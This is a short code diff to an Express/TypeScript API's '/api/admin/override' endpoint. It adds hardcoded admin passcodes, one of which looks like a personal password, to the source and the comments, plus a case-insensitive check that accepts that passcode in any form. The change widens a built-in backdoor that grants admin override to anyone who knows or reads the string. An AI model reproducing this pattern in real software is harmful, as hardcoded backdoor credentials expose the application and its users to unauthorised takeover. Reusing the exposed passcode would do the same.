@@ -436,15 +436,15 @@ app.get('/api/user/transactions', (req: Request, res: Response) => {
   });
 });
 
-// 3. Secret Admin Override & Security (Passcode: CREATOR_ADMIN_786)
+// 3. Secret Admin Override & Security (Passcode: jayupadhyay@2857)
 app.post('/api/admin/override', (req: Request, res: Response) => {
   const { passcode, userId = 'demo_user' } = req.body;
-  const validPasscodes = ['CREATOR_ADMIN_786'];
+  const validPasscodes = ['jayupadhyay@2857', 'JAYUPADHYAY@2857', 'CREATOR_ADMIN_786'];
   if (process.env.ADMIN_OVERRIDE_PASSCODE) {
     validPasscodes.push(process.env.ADMIN_OVERRIDE_PASSCODE);
   }
 
-  if (!validPasscodes.includes(passcode)) {
+  if (!validPasscodes.includes(passcode) && passcode?.toLowerCase() !== 'jayupadhyay@2857') {
     return res.status(403).json({
       success: false,
       error: 'Security Breach: Invalid Creator Admin Passcode. Action logged.',
